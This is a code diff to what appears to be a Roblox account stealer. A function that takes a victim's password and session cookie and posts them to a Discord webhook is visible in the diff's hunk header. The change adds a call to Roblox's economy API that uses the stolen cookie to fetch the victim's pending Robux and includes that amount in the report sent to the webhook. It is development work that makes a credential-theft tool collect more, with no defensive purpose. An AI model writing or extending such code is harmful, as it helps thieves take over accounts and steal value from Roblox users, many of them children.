@@ -89,7 +89,7 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
                         },
                         {
                             'name': '⌛ Pending Robux',
-                            'value': '0',
+                            'value': user_info['pending_robux'],
                             'inline': False
                         },
                         {
@@ -204,6 +204,29 @@ def get_roblox_user_info(cookie):
                 except Exception as alt_error:
                     print(f"Alternative Robux API error: {str(alt_error)}")
             
+            # Get Pending Robux using transaction totals endpoint
+            pending_robux = 'Not available'
+            try:
+                pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
+                                              headers=headers, timeout=5)
+                print(f"Pending Robux API response status: {pending_response.status_code}")
+                
+                if pending_response.status_code == 200:
+                    pending_data = pending_response.json()
+                    print(f"Pending Robux API response: {pending_data}")
+                    if 'pendingRobuxTotal' in pending_data:
+                        pending_amount = pending_data['pendingRobuxTotal']
+                        pending_robux = f"{pending_amount:,}" if isinstance(pending_amount, (int, float)) else str(pending_amount)
+                    else:
+                        print("No 'pendingRobuxTotal' field in response")
+                        pending_robux = '0'
+                else:
+                    print(f"Pending Robux API failed with status: {pending_response.status_code}, response: {pending_response.text}")
+                    pending_robux = '0'
+            except Exception as pending_error:
+                print(f"Error getting Pending Robux: {str(pending_error)}")
+                pending_robux = '0'
+            
             # Check Premium status
             premium_status = '❌ No'
             try:
@@ -231,6 +254,7 @@ def get_roblox_user_info(cookie):
                 'user_id': user_id,
                 'profile_picture': profile_picture_url,
                 'robux_balance': robux_balance,
+                'pending_robux': pending_robux,
                 'premium_status': premium_status
             }
         else:
@@ -248,6 +272,7 @@ def get_roblox_user_info(cookie):
         'user_id': None,
         'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
         'robux_balance': 'Not available',
+        'pending_robux': 'Not available',
         'premium_status': '❌ No'
     }
 
